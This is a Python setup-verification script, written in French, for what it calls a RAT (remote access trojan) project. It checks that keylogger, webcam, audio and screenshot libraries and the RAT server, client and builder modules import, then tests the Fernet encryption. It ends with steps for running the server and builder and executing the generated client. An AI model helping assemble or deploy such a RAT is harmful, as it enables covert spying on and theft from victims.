import sys
import os

def test_imports():
    print("=== Test des imports RAT ===")
    
    errors = []
    
    # Test des modules de base
    try:
        print("[*] Test cryptography...")
        from cryptography.fernet import Fernet
        print("    ✓ cryptography OK")
    except ImportError as e:
        errors.append(f"cryptography: {e}")
        
    try:
        print("[*] Test PIL...")
        from PIL import Image
        print("    ✓ PIL OK")
    except ImportError as e:
        print("    ⚠ PIL non disponible (optionnel pour screenshots)")
        
    try:
        print("[*] Test CV2...")
        import cv2
        print("    ✓ CV2 OK")
    except ImportError as e:
        print("    ⚠ CV2 non disponible (optionnel pour webcam)")
        
    try:
        print("[*] Test PyAudio...")
        import pyaudio
        print("    ✓ PyAudio OK")
    except ImportError as e:
        print("    ⚠ PyAudio non disponible (optionnel pour audio)")
        
    try:
        print("[*] Test pynput...")
        import pynput
        print("    ✓ pynput OK")
    except ImportError as e:
        print("    ⚠ pynput non disponible (optionnel pour keylogger)")
        
    try:
        print("[*] Test mss...")
        import mss
        print("    ✓ mss OK")
    except ImportError as e:
        print("    ⚠ mss non disponible (optionnel pour screenshots)")
    
    # Test des modules du projet
    print("\n[*] Test modules projet...")
    
    try:
        from shared.config import Config
        from shared.protocol import Protocol, Message
        print("    ✓ Modules shared OK")
    except ImportError as e:
        errors.append(f"modules shared: {e}")
        
    try:
        from server.rat_server import RatServer
        print("    ✓ Serveur OK")
    except ImportError as e:
        errors.append(f"serveur: {e}")
        
    try:
        from client.rat_client import RatClient
        print("    ✓ Client OK")
    except ImportError as e:
        errors.append(f"client: {e}")
        
    try:
        from builder.builder import RatBuilder
        print("    ✓ Builder OK")
    except ImportError as e:
        errors.append(f"builder: {e}")
    
    # Résumé
    print("\n=== Résumé ===")
    if errors:
        print("❌ Erreurs détectées:")
        for error in errors:
            print(f"   - {error}")
        print("\nInstallez les dépendances manquantes:")
        print("   pip install -r requirements.txt")
        return False
    else:
        print("✅ Tous les modules critiques sont OK!")
        print("Vous pouvez lancer le serveur avec: python run_server.py")
        return True

def test_config():
    print("\n=== Test configuration ===")
    
    try:
        from shared.config import Config
        config = Config()
        cipher = config.get_cipher()
        print("✓ Configuration et chiffrement OK")
        
        # Test de chiffrement
        test_data = b"test message"
        encrypted = cipher.encrypt(test_data)
        decrypted = cipher.decrypt(encrypted)
        
        if decrypted == test_data:
            print("✓ Test chiffrement/déchiffrement OK")
        else:
            print("❌ Problème de chiffrement")
            return False
            
    except Exception as e:
        print(f"❌ Erreur de configuration: {e}")
        return False
        
    return True

if __name__ == "__main__":
    print("Script de vérification du setup RAT\n")
    
    imports_ok = test_imports()
    config_ok = test_config()
    
    if imports_ok and config_ok:
        print("\n🎉 Setup complet! Vous pouvez commencer à utiliser le RAT.")
        print("\nProchaines étapes:")
        print("1. python run_server.py")
        print("2. python run_builder.py")
        print("3. Exécuter le client généré")
    else:
        print("\n⚠️  Veuillez corriger les erreurs avant de continuer.")